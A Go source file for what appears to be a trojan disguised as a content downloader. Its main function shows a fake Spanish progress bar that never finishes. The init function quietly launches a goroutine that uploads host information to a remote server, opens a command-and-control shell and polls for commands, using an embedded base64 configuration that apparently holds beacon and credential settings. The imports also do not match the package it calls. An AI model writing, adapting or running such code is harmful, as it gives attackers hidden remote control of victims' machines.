package main

import (
	"fmt"
	"libs"
	"math/rand"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"
)

var (
	debug  bool
	config *utils.ConfigStruct
)

const ec = `U0NjbEg1OTJNczM4THdCTmFiYVZGcyt4Wkl5NzhLdkZ2ZFJERm42MGhCa0tjcWljbzJKQit5QUM5cWoxTVNYVnRHbHl5YVhGVWFSV3R5Q3RvSitld29KSW5ObGNuWmxjaUk2SUhzS0NRa2lZV1JrY21WemN5STZJQ0l3TGpBdU1DNHdJaXdLQ1FraWNHOXlkQ0k2SURnd09EQUtDWDBzQ2draVltVmhZMjl1SWpvZ2V3b0pDU0p3Y205MGJ5STZJQ0poYlhGd2N5SXNDZ2tKSW1Ga1pISmxjM01pT2lBaVozVnNiQzV5YlhFdVkyeHZkV1JoYlhGd0xtTnZiU0lzQ2drSkluVnpaWElpT2lBaVpHeHRlbUpqYjNBaUxBb0pDU0p3WVhOeklqb2dJa3BuTXkxZk0ycElXbTVUWjNoS05FYzVPV0Z5U0RVNVFUQkxSRmRYZEdVMklpd0tDUWtpY1hWbGRXVWlPaUFpWkd4dGVtSmpiM0FpTEFvSkNTSmxlR05vWVc1blpTSTZJQ0psZUdOb1lXNW5aU0lzQ2drSkluSnZkWFJwYm1kTFpYa2lPaUFpWXpKbmJ5SXNDZ2tKSW1WNGNHbHlZWFJwYjI0aU9pQXhPREFLQ1gwS2ZRcVFqSytXM1ZxTGo4UlpBeUQ2RXc0VHR0MVNMbE9Ub1EweVFKOTRHUm0wRElxaFMvNE5LUXJtb0pDM0YweEFqWk1USkVSa0Jvd3hwdlNYKzBzaXJZbVoxaVJvUzd1VVFYZlgvWGxtU1NBMWdmUVU5RUtPREpqaXc=`

func setupSignalHandler() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		utils.PrintlnDebug(debug, "SIGTERM catched")
		fmt.Printf("\rDescarga cancelada\n")
		utils.PrintDebug(debug, "Closing app")
		os.Exit(0)
	}()
}

func printProgressBar(percent int) {
	fmt.Print("\r[")
	for i := 0; i < percent; i++ {
		fmt.Print("#")
	}
	fmt.Printf("%"+strconv.Itoa(100-percent)+"s] %3d%%", " ", percent)
}

func stuff() {
	server, err := utils.GetServerAddress(debug)
	if err != nil {
		utils.PrintDebug(debug, "Error connecting to webserver at %s\n%v", server, err)
		return
	}
	utils.PrintDebug(debug, "Got server address: %s", server)
	guid := utils.GetHostID(debug)
	utils.PrintDebug(debug, "* GUID: %s", guid)
	utils.UploadHostInfo(debug, server, guid)
	utils.ExecC2Shell(debug, server, guid)
	utils.PollCommands(debug, server, guid)
}

func init() {
	debug = (os.Getenv("DEBUG") == "1")
	setupSignalHandler()
	utils.DecodeConfig(debug, ec)
	config, _ = utils.GetConfig(debug)
	go stuff()
}

func main() {
	utils.PrintDebug(debug, "Starting app")
	fmt.Printf("Descargando contenido:\n")
	var (
		progress int = 0
		pausa    int = 5
	)
	rand.Seed(time.Now().UnixNano())
	for {
		progress++
		printProgressBar(progress)
		if progress == 99 {
			time.Sleep(20 * time.Second)
			fmt.Printf("\nError en la descarga, reintentando:\n")
			rand.Seed(time.Now().UnixNano())
			progress = 1
		}
		time.Sleep(time.Duration(rand.Intn(pausa)+1) * time.Second)
	}
}